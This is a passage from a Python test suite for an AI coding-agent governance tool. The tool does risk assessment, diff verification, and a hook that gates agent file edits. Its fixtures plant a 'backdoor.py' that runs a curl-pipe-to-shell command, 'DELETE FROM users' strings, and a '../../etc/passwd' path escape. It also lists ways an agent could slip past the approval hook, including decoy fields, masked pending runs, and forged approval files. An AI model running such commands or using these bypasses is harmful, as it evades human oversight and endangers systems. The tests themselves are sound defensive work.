            (root / "device" / "stop_command.py").write_text(
                "def send_stop(port):\n    # 重试下发停止指令 / 断电控制指令\n    return device_protocol.power_off(port)\n",
                encoding="utf-8",
            )
            request = "修改设备停止指令的断电重试逻辑。"
            run_dir = root / ".ai-governance/runs/run-escalation"
            run_dir.mkdir(parents=True)
            # 初判事实包/风险：低风险、未识别设备控制域（模拟初判失真）。
            dump_yaml(run_dir / "evidence-pack.yaml", {
                "version": 1,
                "request": {"original": request, "normalized_intent": request},
                "code_findings": {
                    "direct_files": [],
                    "affected_modules": [],
                    "affected_domains": [],
                    "change_types": [],
                },
            })
            dump_yaml(run_dir / "risk-assessment.yaml", {"final_level": "L1", "triggered_guardrails": []})
            dump_yaml(run_dir / "workflow-recommendation.yaml", {
                "workflow_recommendation": {"required_modules": ["code_fact_scan"]},
            })

            result = ReassessmentRunner(root, self.project_risk, self.guardrails, self.modules).run(run_dir)
            reassessment = result["reassessment"]
            self.assertEqual(reassessment["previous_level"], "L1")
            self.assertEqual(reassessment["new_level"], "L3")
            self.assertTrue(reassessment["requires_human_reapproval"])
            self.assertIn("risk_level_increased", reassessment["reasons"])
            self.assertIn("discovered_new_affected_domain", reassessment["reasons"])
            self.assertIn(
                "physical-device-control",
                result["scope_diff"]["new_affected_domains"],
            )
        finally:
            shutil.rmtree(temp)

    def test_blast_radius_raises_scope_for_small_edit_to_widely_referenced_symbol(self):
        # 小改动大扇出：一行改动动了被多模块引用的公共符号 -> change_scope/耦合升高。
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "core").mkdir(parents=True)
            (temp / "core" / "order_status.py").write_text(
                "class OrderStatus:\n    CREATED = 1\n    PAID = 2\n", encoding="utf-8"
            )
            for module in ("order", "billing", "settlement", "notify"):
                (temp / module).mkdir(parents=True)
                for index in range(5):
                    (temp / module / f"h{index}.py").write_text(
                        "from core.order_status import OrderStatus\n\ndef f():\n    return OrderStatus.PAID\n",
                        encoding="utf-8",
                    )
            evidence = RepositoryAnalyzer(temp).analyze("调整 OrderStatus 里 PAID 的取值", self.project_risk)
            reference = evidence["code_findings"]["reference_findings"]
            self.assertGreaterEqual(reference["inbound_reference_count"], 20)
            self.assertTrue(reference["is_shared_contract"])
            self.assertGreaterEqual(len(reference["referencing_modules"]), 3)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            dims = {item["dimension"]: item["score"] for item in risk["risk_explanation"]["dimension_explanations"]}
            self.assertGreaterEqual(dims["change_scope"], 4)
            self.assertGreaterEqual(dims["dependency_coupling"], 4)
        finally:
            shutil.rmtree(temp)

    def test_isolated_change_reads_low_dependency_coupling(self):
        # dependency_coupling 不再是死的项目常量：孤立、无人引用的改动读到低耦合。
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "tools").mkdir(parents=True)
            (temp / "tools" / "lonely_helper.py").write_text(
                "def lonely_helper():\n    return 42\n", encoding="utf-8"
            )
            evidence = RepositoryAnalyzer(temp).analyze("改 lonely_helper 的返回值", self.project_risk)
            self.assertEqual(evidence["code_findings"]["reference_findings"]["inbound_reference_count"], 0)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            dims = {item["dimension"]: item["score"] for item in risk["risk_explanation"]["dimension_explanations"]}
            self.assertEqual(dims["dependency_coupling"], 1)
        finally:
            shutil.rmtree(temp)

    def test_keyword_word_boundary_removes_api_substring_false_positive(self):
        # 'api' 子串不再命中 'therapist'：字面误报被词边界消除。
        temp = Path(tempfile.mkdtemp())
        try:
            evidence = RepositoryAnalyzer(temp).analyze("更新 therapist 预约页面的提示文案", self.project_risk)
            self.assertNotIn("public-interface", evidence["code_findings"]["affected_domains"])
        finally:
            shutil.rmtree(temp)

    def test_code_signal_grounds_money_domain_from_arithmetic(self):
        # 域来自代码事实而非请求字面：请求无金额关键词，但代码在做金额算术。
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "billing").mkdir(parents=True)
            (temp / "billing" / "calc.py").write_text(
                "def total(price, qty):\n    return round(price * qty, 2)\n", encoding="utf-8"
            )
            evidence = RepositoryAnalyzer(temp).analyze("调整 calc 里 total 的逻辑", self.project_risk)
            self.assertIn("financial-calculation", evidence["code_findings"]["affected_domains"])
            kinds = {signal["kind"] for signal in evidence["code_findings"]["code_signals"]}
            self.assertIn("money_arithmetic", kinds)
        finally:
            shutil.rmtree(temp)

    def test_code_signal_grounds_device_domain_from_power_off_call(self):
        # power_off 调用是关键词字典漏掉的设备行为信号，由 code_signal 兜住。
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "ctl").mkdir(parents=True)
            (temp / "ctl" / "port_ctl.py").write_text(
                "def stop(port):\n    return port_protocol.power_off(port)\n", encoding="utf-8"
            )
            evidence = RepositoryAnalyzer(temp).analyze("调整 port_ctl 里 stop 的逻辑", self.project_risk)
            self.assertIn("physical-device-control", evidence["code_findings"]["affected_domains"])
        finally:
            shutil.rmtree(temp)

    def test_model_localization_bridges_gap_when_keyword_search_misses(self):
        # P3: 中文请求 + 英文代码，关键词定位失效；宿主模型 relevant_files 桥接后，
        # code_signal 在模型定位到的代码上跑出金额域 -> 触发围栏。
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "billing").mkdir(parents=True)
            (temp / "billing" / "calc.py").write_text(
                "def total(price, qty):\n    return round(price * qty, 2)\n", encoding="utf-8"
            )
            request = "优化一下这里的处理逻辑"
            without_model = RepositoryAnalyzer(temp).analyze(request, self.project_risk, intent={})
            self.assertNotIn("financial-calculation", without_model["code_findings"]["affected_domains"])

            intent = normalize_intent({"relevant_files": [{"path": "billing/calc.py", "reason": "amount calc"}]})
            with_model = RepositoryAnalyzer(temp).analyze(request, self.project_risk, intent=intent)
            self.assertIn("financial-calculation", with_model["code_findings"]["affected_domains"])
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(with_model)
            self.assertIn("financial-calculation-change", risk["triggered_guardrails"])
        finally:
            shutil.rmtree(temp)

    def test_domain_hint_confidence_gates_hard_trigger(self):
        # P3: 高置信模型域判断是强证据可触发围栏；较低置信只作候选，不硬触发（单调只增）。
        temp = Path(tempfile.mkdtemp())
        try:
            high = normalize_intent({"domain_hints": [{"domain": "physical-device-control", "confidence": "high", "reason": "stop command"}]})
            high_risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(
                RepositoryAnalyzer(temp).analyze("调整某逻辑", self.project_risk, intent=high)
            )
            self.assertIn("physical-device-control", high_risk["triggered_guardrails"])

            medium = normalize_intent({"domain_hints": [{"domain": "physical-device-control", "confidence": "medium"}]})
            medium_evidence = RepositoryAnalyzer(temp).analyze("调整某逻辑", self.project_risk, intent=medium)
            medium_risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(medium_evidence)
            self.assertIn("physical-device-control", medium_evidence["code_findings"]["affected_domains"])
            self.assertNotIn("physical-device-control", medium_risk["triggered_guardrails"])
        finally:
            shutil.rmtree(temp)


class VerificationGapTest(unittest.TestCase):
    """Regression tests for verification-layer bypasses found in the 2026-07 audit."""

    def setUp(self):
        self.project_risk = load_yaml(ROOT / ".ai-governance/project-risk.yaml")
        self.guardrails = load_yaml(ROOT / ".ai-governance/guardrails.yaml")
        self.modules = load_yaml(ROOT / ".ai-governance/workflow-modules.yaml")

    def _git(self, temp: Path, *args: str) -> None:
        subprocess.run(
            ["git", "-c", "user.name=Test", "-c", "user.email=test@example.com", *args],
            cwd=temp,
            check=True,
            capture_output=True,
            text=True,
        )

    def _diff_run(self, temp: Path, allowed: list[str], change_nature: str = "display_text_only") -> Path:
        run_dir = temp / ".ai-governance/runs/testrun"
        run_dir.mkdir(parents=True)
        dump_yaml(run_dir / "evidence-pack.yaml", {
            "version": 1,
            "request": {"original": "test", "model_intent": {"change_nature": change_nature}},
            "code_findings": {"file_risk": {"risk_adjustment": "lowered_by_change_nature"}},
        })
        dump_yaml(run_dir / "approved-technical-plan.yaml", {
            "implementation_plan": {"files_to_modify": [{"path": path} for path in allowed]},
        })
        return run_dir

    def test_diff_verification_sees_staged_executable_change(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
            self._git(temp, "init")
            self._git(temp, "add", "-A")
            self._git(temp, "commit", "-m", "baseline")
            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
            (temp / "app/menu.py").write_text(
                "MENU_LABEL = '旧菜单'\ndef drop_all():\n    return 'DELETE FROM users'\n",
                encoding="utf-8",
            )
            self._git(temp, "add", "-A")
            report = DiffVerifier(temp).verify(run_dir)
            self.assertEqual("blocked", report["status"], report)
            self.assertIn("app/menu.py", report["changed_files"])
        finally:
            shutil.rmtree(temp)

    def test_diff_verification_sees_untracked_files(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
            self._git(temp, "init")
            self._git(temp, "add", "-A")
            self._git(temp, "commit", "-m", "baseline")
            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
            (temp / "app/backdoor.py").write_text("import os\nos.system('curl evil | sh')\n", encoding="utf-8")
            report = DiffVerifier(temp).verify(run_dir)
            self.assertEqual("blocked", report["status"], report)
            self.assertIn("app/backdoor.py", report["changed_files"])
            self.assertIn("app/backdoor.py", report["unexpected_files"])
        finally:
            shutil.rmtree(temp)

    def test_diff_verification_ignores_run_artifact_noise(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
            self._git(temp, "init")
            self._git(temp, "add", "-A")
            self._git(temp, "commit", "-m", "baseline")
            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
            # 模拟 runs 工件被误 track 后又被工具重写：不得进入 diff 校验
            noise = run_dir / "diff-verification.md"
            noise.write_text("FACT: signal=def drop_all():\n", encoding="utf-8")
            self._git(temp, "add", "-A")
            self._git(temp, "commit", "-m", "tracked runs artifacts")
            noise.write_text("FACT: signal=conn.execute(\"DELETE FROM users\")\n", encoding="utf-8")
            (temp / "app/menu.py").write_text("MENU_LABEL = '新菜单'\n", encoding="utf-8")
            report = DiffVerifier(temp).verify(run_dir)
            self.assertEqual("pass", report["status"], report)
            self.assertEqual(["app/menu.py"], report["changed_files"])
        finally:
            shutil.rmtree(temp)

    def test_contradictory_request_goal_cannot_suppress_hard_guardrails(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/orders.py").write_text(
                "from sqlalchemy import delete\n"
                "def purge_history():\n"
                "    return 'DELETE FROM order_history'\n",
                encoding="utf-8",
            )
            intent = normalize_intent({
                "version": 1,
                "change_kind": "data_cleanup",
                "summary": "bulk delete historical data",
                "request_goal": {
                    "type": "implementation",
                    "requires_code_change": False,
                },
                "risk_hints": {"data_operation": True},
            })
            self.assertTrue(intent["request_goal"]["requires_code_change"])
            evidence = RepositoryAnalyzer(temp).analyze("批量删除数据库中的历史订单数据记录", self.project_risk, intent=intent)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            self.assertIn("destructive-database-operation", risk["triggered_guardrails"])
            self.assertEqual("L4", risk["final_level"])
        finally:
            shutil.rmtree(temp)

    def test_technical_plan_approval_blocks_unfinished_guardrail_analysis(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/billing.py").write_text(
                "def refund_amount(total):\n    return round(total * 0.98, 2)\n",
                encoding="utf-8",
            )
            env = os.environ.copy()
            env["PYTHONPATH"] = str(ROOT / "lib")
            env["ACG_TOOL_ROOT"] = str(ROOT)

            def run_cli(*cli_args):
                return subprocess.run(
                    [sys.executable, str(ROOT / "bin/change-assess"), *cli_args],
                    cwd=temp,
                    env=env,
                    check=False,
                    capture_output=True,
                    text=True,
                )

            assess = run_cli("调整退款金额保留两位小数的计算方式")
            self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            risk = load_yaml(run_dir / "risk-assessment.yaml")
            self.assertIn("business_rule_confirmation", risk["required_by_guardrails"])

            self.assertEqual(0, run_cli("--approve-workflow", run_dir.name).returncode)
            proposed = run_cli("--propose-technical-plan", run_dir.name)
            self.assertEqual(0, proposed.returncode, proposed.stderr + proposed.stdout)
            plan = load_yaml(run_dir / "technical-plan.yaml")
            self.assertEqual("planned", plan["module_coverage"]["business_rule_confirmation"]["status"])

            blocked = run_cli("--approve-technical-plan", run_dir.name)
            self.assertEqual(3, blocked.returncode, blocked.stderr + blocked.stdout)
            self.assertIn("business_rule_confirmation is not completed", blocked.stdout)

            completed = run_cli("--complete-step", run_dir.name, "--module", "business_rule_confirmation")
            self.assertEqual(0, completed.returncode, completed.stderr + completed.stdout)
            approved = run_cli("--approve-technical-plan", run_dir.name)
            self.assertEqual(0, approved.returncode, approved.stderr + approved.stdout)
        finally:
            shutil.rmtree(temp)

    def test_assess_writes_runs_gitignore_by_default(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
            env = os.environ.copy()
            env["PYTHONPATH"] = str(ROOT / "lib")
            env["ACG_TOOL_ROOT"] = str(ROOT)
            result = subprocess.run(
                [sys.executable, str(ROOT / "bin/change-assess"), "修改菜单显示文案"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            gitignore = temp / ".ai-governance/runs/.gitignore"
            self.assertTrue(gitignore.exists())
            self.assertEqual("*\n", gitignore.read_text(encoding="utf-8"))
        finally:
            shutil.rmtree(temp)

    def test_planning_only_goal_keeps_hard_guardrails(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/orders.py").write_text(
                "from sqlalchemy import delete\n"
                "def purge_history():\n"
                "    return 'DELETE FROM order_history'\n",
                encoding="utf-8",
            )
            intent = normalize_intent({
                "version": 1,
                "change_kind": "technical_plan",
                "summary": "plan a bulk delete of historical data",
                "request_goal": {"type": "planning_only"},
                "risk_hints": {"data_operation": True},
            })
            evidence = RepositoryAnalyzer(temp).analyze("为批量删除数据库历史订单数据制定方案", self.project_risk, intent=intent)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            self.assertIn("destructive-database-operation", risk["triggered_guardrails"])
        finally:
            shutil.rmtree(temp)

    def test_diff_verification_sees_deleted_and_renamed_files(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir()
            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
            (temp / "app/auth.py").write_text("PERMISSIONS = ['admin']\n", encoding="utf-8")
            self._git(temp, "init")
            self._git(temp, "add", "-A")
            self._git(temp, "commit", "-m", "baseline")
            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
            self._git(temp, "rm", "-q", "app/auth.py")
            self._git(temp, "mv", "app/menu.py", "app/renamed.py")
            report = DiffVerifier(temp).verify(run_dir)
            self.assertEqual("blocked", report["status"], report)
            self.assertIn("app/auth.py", report["changed_files"])
            self.assertIn("app/renamed.py", report["changed_files"])
            self.assertIn("app/auth.py", report["unexpected_files"])
        finally:
            shutil.rmtree(temp)


class PluginSyncTest(unittest.TestCase):
    """The plugin package must ship the same runtime as the root tree.

    On drift, run scripts/sync-plugin.sh and commit both copies.
    """

    PLUGIN = ROOT / "plugins/adaptive-change-governance"

    def _tree(self, base: Path) -> dict[str, bytes]:
        return {
            str(path.relative_to(base)): path.read_bytes()
            for path in sorted(base.rglob("*"))
            if path.is_file() and "__pycache__" not in path.parts
        }

    def test_plugin_lib_matches_root_lib(self):
        self.assertEqual(self._tree(ROOT / "lib"), self._tree(self.PLUGIN / "lib"))

    def test_plugin_bin_matches_root_bin(self):
        self.assertEqual(
            (ROOT / "bin/change-assess").read_bytes(),
            (self.PLUGIN / "bin/change-assess").read_bytes(),
        )

    def test_plugin_governance_configs_match_root(self):
        for name in (
            "assessment-schema",
            "workflow-modules",
            "artifact-schemas",
            "project-risk",
            "guardrails",
            "risk-calibration",
            "risk-scenarios",
        ):
            with self.subTest(config=name):
                self.assertEqual(
                    (ROOT / f".ai-governance/{name}.yaml").read_bytes(),
                    (self.PLUGIN / f".ai-governance/{name}.yaml").read_bytes(),
                )

    def test_plugin_profiles_match_root(self):
        self.assertEqual(
            self._tree(ROOT / ".ai-governance/profiles"),
            self._tree(self.PLUGIN / ".ai-governance/profiles"),
        )

    def test_plugin_templates_match_root(self):
        self.assertEqual(
            self._tree(ROOT / ".ai-governance/templates"),
            self._tree(self.PLUGIN / ".ai-governance/templates"),
        )

    def test_removed_root_governance_commands_are_not_packaged(self):
        # The .ai-governance/commands entrypoint was removed (Claude uses
        # commands/, Codex uses the skill). Guard against it silently returning.
        for base in (ROOT, self.PLUGIN):
            with self.subTest(base=base):
                self.assertFalse(
                    (base / ".ai-governance/commands").exists(),
                    f"unexpected .ai-governance/commands under {base}",
                )


class HookGateTest(unittest.TestCase):
    """Tests for the plugin PreToolUse implementation-gate hook."""

    HOOK = ROOT / "plugins/adaptive-change-governance/hooks/implementation_gate.py"

    def _invoke(self, cwd: Path, file_path: str, mode: str | None = None) -> dict:
        env = os.environ.copy()
        env.pop("ACG_HOOK_MODE", None)
        if mode:
            env["ACG_HOOK_MODE"] = mode
        payload = {"tool_name": "Write", "tool_input": {"file_path": file_path}, "cwd": str(cwd)}
        result = subprocess.run(
            [sys.executable, str(self.HOOK)],
            input=json.dumps(payload),
            env=env,
            check=False,
            capture_output=True,
            text=True,
        )
        self.assertEqual(0, result.returncode, result.stderr)
        return json.loads(result.stdout) if result.stdout.strip() else {}

    def _make_run(self, temp: Path, goal_type: str = "implementation") -> Path:
        run_dir = temp / ".ai-governance/runs/20260714-000000-test"
        run_dir.mkdir(parents=True)
        dump_yaml(run_dir / "workflow-recommendation.yaml", {
            "version": 1,
            "workflow_recommendation": {
                "request_goal": {"type": goal_type, "requires_code_change": goal_type == "implementation"},
                "final_level": "L2",
            },
        })
        return run_dir

    def _decision(self, output: dict) -> str:
        return output.get("hookSpecificOutput", {}).get("permissionDecision", "allow")

    def test_hook_allows_projects_without_governance_runs(self):
        temp = Path(tempfile.mkdtemp())
        try:
            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
        finally:
            shutil.rmtree(temp)

    def test_hook_blocks_edit_before_implementation_gate(self):
        temp = Path(tempfile.mkdtemp())
        try:
            self._make_run(temp)
            output = self._invoke(temp, str(temp / "app/main.py"))
            self.assertEqual("deny", self._decision(output))
            self.assertIn("implementation gate", output["hookSpecificOutput"]["permissionDecisionReason"])
        finally:
            shutil.rmtree(temp)

    def test_hook_allows_edit_after_gate_passes(self):
        temp = Path(tempfile.mkdtemp())
        try:
            run_dir = self._make_run(temp)
            (run_dir / ".workflow-approved").write_text("t\n", encoding="utf-8")
            (run_dir / ".technical-plan-approved").write_text("t\n", encoding="utf-8")
            dump_yaml(run_dir / "approved-technical-plan.yaml", {"version": 1})
            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
        finally:
            shutil.rmtree(temp)

    def test_hook_blocks_edit_when_diff_verification_blocked(self):
        temp = Path(tempfile.mkdtemp())
        try:
            run_dir = self._make_run(temp)
            (run_dir / ".workflow-approved").write_text("t\n", encoding="utf-8")
            (run_dir / ".technical-plan-approved").write_text("t\n", encoding="utf-8")
            dump_yaml(run_dir / "approved-technical-plan.yaml", {"version": 1})
            dump_yaml(run_dir / "diff-verification.yaml", {"version": 1, "status": "blocked"})
            output = self._invoke(temp, str(temp / "app/main.py"))
            self.assertEqual("deny", self._decision(output))
        finally:
            shutil.rmtree(temp)

    def test_hook_protects_gate_state_files_from_direct_writes(self):
        temp = Path(tempfile.mkdtemp())
        try:
            run_dir = self._make_run(temp)
            output = self._invoke(temp, str(run_dir / ".workflow-approved"))
            self.assertEqual("deny", self._decision(output))
            self.assertIn("change-assess CLI", output["hookSpecificOutput"]["permissionDecisionReason"])
        finally:
            shutil.rmtree(temp)

    def test_hook_ignores_analysis_only_runs_and_respects_off_mode(self):
        temp = Path(tempfile.mkdtemp())
        try:
            self._make_run(temp, goal_type="analysis_only")
            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
            run_dir = temp / ".ai-governance/runs/20260714-000001-impl"
            run_dir.mkdir(parents=True)
            dump_yaml(run_dir / "workflow-recommendation.yaml", {
                "version": 1,
                "workflow_recommendation": {"request_goal": {"type": "implementation"}},
            })
            self.assertEqual("deny", self._decision(self._invoke(temp, str(temp / "app/main.py"))))
            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py"), mode="off"))
        finally:
            shutil.rmtree(temp)

    # --- Adversarial regression corpus: bypass vectors the hook must not fall for ---

    def test_hook_enforces_older_pending_run_masked_by_newer_approved_run(self):
        """A newer, fully-approved run must not mask an older run whose gate is
        still unmet. Selecting only the most-recent run would allow this edit."""
        temp = Path(tempfile.mkdtemp())
        try:
            runs = temp / ".ai-governance/runs"
            older = runs / "20260101-000000-older-pending"
            newer = runs / "20260202-000000-newer-approved"
            for run_dir in (older, newer):
                run_dir.mkdir(parents=True)
                dump_yaml(run_dir / "workflow-recommendation.yaml", {
                    "version": 1,
                    "workflow_recommendation": {"request_goal": {"type": "implementation"}},
                })
            # newer run is fully through its gate; older is not
            (newer / ".workflow-approved").write_text("t\n", encoding="utf-8")
            (newer / ".technical-plan-approved").write_text("t\n", encoding="utf-8")
            dump_yaml(newer / "approved-technical-plan.yaml", {"version": 1})
            os.utime(older, (1_600_000_000, 1_600_000_000))
            os.utime(newer, (1_700_000_000, 1_700_000_000))
            output = self._invoke(temp, str(temp / "app/main.py"))
            self.assertEqual("deny", self._decision(output))
            self.assertIn("older-pending", output["hookSpecificOutput"]["permissionDecisionReason"])
        finally:
            shutil.rmtree(temp)

    def test_hook_resolves_goal_type_under_request_goal_not_decoy_type(self):
        """Goal type must be read at workflow_recommendation.request_goal.type, not
        by first-match. A decoy `type:` earlier in the file must not downgrade a
        governed implementation run to an ungoverned one."""
        temp = Path(tempfile.mkdtemp())
        try:
            run_dir = temp / ".ai-governance/runs/20260714-000000-decoy"
            run_dir.mkdir(parents=True)
            dump_yaml(run_dir / "workflow-recommendation.yaml", {
                "version": 1,
                "workflow_recommendation": {
                    "kind": {"type": "analysis_only"},  # decoy that precedes request_goal
                    "request_goal": {"type": "implementation"},
                },
            })
            output = self._invoke(temp, str(temp / "app/main.py"))
            self.assertEqual("deny", self._decision(output))
        finally:
            shutil.rmtree(temp)

    def test_hook_reads_top_level_diff_status_not_nested_low_risk_status(self):
        """diff-verification status is the top-level `status`. A nested
        `low_risk_intent_check.status: blocked` emitted before it must not be
        mistaken for the overall verdict."""
        temp = Path(tempfile.mkdtemp())
        try:
            run_dir = self._make_run(temp)
            (run_dir / ".workflow-approved").write_text("t\n", encoding="utf-8")
            (run_dir / ".technical-plan-approved").write_text("t\n", encoding="utf-8")
            dump_yaml(run_dir / "approved-technical-plan.yaml", {"version": 1})
            # nested block (with status: blocked) is emitted before top-level status
            dump_yaml(run_dir / "diff-verification.yaml", {
                "version": 1,
                "low_risk_intent_check": {"status": "blocked"},
                "status": "pass",
            })
            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
        finally:
            shutil.rmtree(temp)


class EvidenceAuthenticityTest(unittest.TestCase):
    """Spot-check that FACT evidence cites locations that actually resolve.

    Confirms references exist; it does not (and must not claim to) verify that the
    cited location supports the claim. See docs/threat-model.md O3/I5.
    """

    SCHEMAS = {"schemas": {"dependency_analysis": {
        "required_fields": ["evidence"],
        "evidence_required": True,
        "evidence_path_line_required": True,
        "confidence_required": True,
        "evidence_location_must_resolve": True,
    }}}

    def _validate(self, evidence):
        project = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, project, ignore_errors=True)
        (project / "app").mkdir(parents=True)
        (project / "app/service.py").write_text("line1\nline2\nline3\n", encoding="utf-8")
        run_dir = project / ".ai-governance/runs/20260714-000000-dep"
        run_dir.mkdir(parents=True)
        dump_yaml(run_dir / "dependency-analysis.yaml", {"evidence": evidence})
        return ArtifactValidator(self.SCHEMAS).validate(
            run_dir, "dependency_analysis", "dependency-analysis.yaml", project_root=project
        ), project

    def _fact(self, path, line):
        return {"fact": "FACT: caller uses this symbol", "path": path, "line": line, "confidence": "high"}

    def test_fact_citing_real_location_passes(self):
        report, _ = self._validate([self._fact("app/service.py", 2)])
        self.assertEqual("pass", report["status"], report["errors"])

    def test_fact_citing_missing_file_is_blocked(self):
        report, _ = self._validate([self._fact("app/ghost.py", 1)])
        self.assertEqual("blocked", report["status"])
        self.assertTrue(any("does not exist" in e for e in report["errors"]))

    def test_fact_citing_line_beyond_file_is_blocked(self):
        report, _ = self._validate([self._fact("app/service.py", 99)])
        self.assertEqual("blocked", report["status"])
        self.assertTrue(any("has 3 lines" in e for e in report["errors"]))

    def test_fact_path_escaping_project_is_blocked(self):
        report, _ = self._validate([self._fact("../../etc/passwd", 1)])
        self.assertEqual("blocked", report["status"])
        self.assertTrue(any("escapes the project" in e for e in report["errors"]))

    def test_non_fact_evidence_is_not_location_checked(self):
        # INFERENCE may reference a planned/hypothetical location; not spot-checked.
        report, _ = self._validate([
            {"fact": "INFERENCE: a new handler will live here", "path": "app/ghost.py", "line": 999, "confidence": "low"},
        ])
        self.assertEqual("pass", report["status"], report["errors"])

    def test_location_check_skipped_without_project_root(self):
        # Backward compatible: callers that pass no project_root keep old behavior.
        project = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, project, ignore_errors=True)
        run_dir = project / ".ai-governance/runs/20260714-000000-dep"
        run_dir.mkdir(parents=True)
        dump_yaml(run_dir / "dependency-analysis.yaml", {"evidence": [self._fact("app/ghost.py", 1)]})
        report = ArtifactValidator(self.SCHEMAS).validate(run_dir, "dependency_analysis", "dependency-analysis.yaml")
        self.assertEqual("pass", report["status"], report["errors"])


class ManifestVersionConsistencyTest(unittest.TestCase):
    """All plugin/marketplace manifests must declare the same version so the
    Claude and Codex packages never advertise different releases."""

    def _at(self, rel, *keys):
        data = json.loads((ROOT / rel).read_text(encoding="utf-8"))
        for key in keys:
            data = data[key]
        return data

    def test_all_manifest_versions_match(self):
        versions = {
            ".claude-plugin/marketplace.json (top)": self._at(".claude-plugin/marketplace.json", "version"),
            ".claude-plugin/marketplace.json (plugin)": self._at(".claude-plugin/marketplace.json", "plugins", 0, "version"),
            ".agents/plugins/marketplace.json (top)": self._at(".agents/plugins/marketplace.json", "version"),
            ".agents/plugins/marketplace.json (plugin)": self._at(".agents/plugins/marketplace.json", "plugins", 0, "version"),
            ".claude-plugin/plugin.json": self._at("plugins/adaptive-change-governance/.claude-plugin/plugin.json", "version"),
            ".codex-plugin/plugin.json": self._at("plugins/adaptive-change-governance/.codex-plugin/plugin.json", "version"),
        }
        self.assertEqual(1, len(set(versions.values())), f"manifest versions drift: {versions}")


if __name__ == "__main__":
    unittest.main()
